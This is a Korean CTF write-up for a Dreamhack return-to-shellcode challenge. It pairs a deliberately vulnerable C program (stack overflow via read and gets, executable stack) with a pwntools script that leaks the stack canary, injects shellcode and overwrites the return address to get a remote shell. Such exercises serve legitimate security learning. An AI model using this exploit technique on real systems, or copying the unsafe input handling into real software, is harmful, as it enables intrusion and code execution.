```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

# 분석

Stack canary를 얻어내 stack canary를 변조하지 않고 return address를 `buf`로 변조하고, `buf`에는 쉘코드를 삽입하여 쉘을 탈취하면 flag를 얻을 수 있다.

# 취약점

`buf`는 길이 `0x50`의 `char` 배열임에도 `read(0, buf, 0x100);`에서 입력크기 제한이 `0x100`으로, 공격하기에 충분히 큰 크기를 가진다.

# 공격

`buf`와 `$rbp`의 거리를 활용하여 stack canary `0x7`바이트의 정보를 얻어내고, 그 정보를 바탕으로 `payload`를 구성하여 쉘을 탈취한다.

```python
# Name: r2s.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = "debug"

HOST = "host3.dreamhack.games"
PORT = 18007 # The given port

conn = remote(HOST, PORT)
# conn = process('./r2s')

conn.recvuntil(b'Address of the buf: ')
buf_address = int(conn.recvline(), base=16)
conn.recvuntil(b'Distance between buf and $rbp: ')
size = int(conn.recvline()) - 8
conn.sendlineafter(b'Input: ', b'A' * size)
conn.recvuntil(b'Your input is')
conn.recvuntil(b'\x0a')
canary = conn.recv(7)
payload = asm(shellcraft.amd64.linux.sh())
payload += asm('nop') * (size - len(payload))
payload += b'\x00' + canary + b'A' * 8 + p64(buf_address)
conn.sendlineafter(b'Input: ', payload)
conn.interactive()
```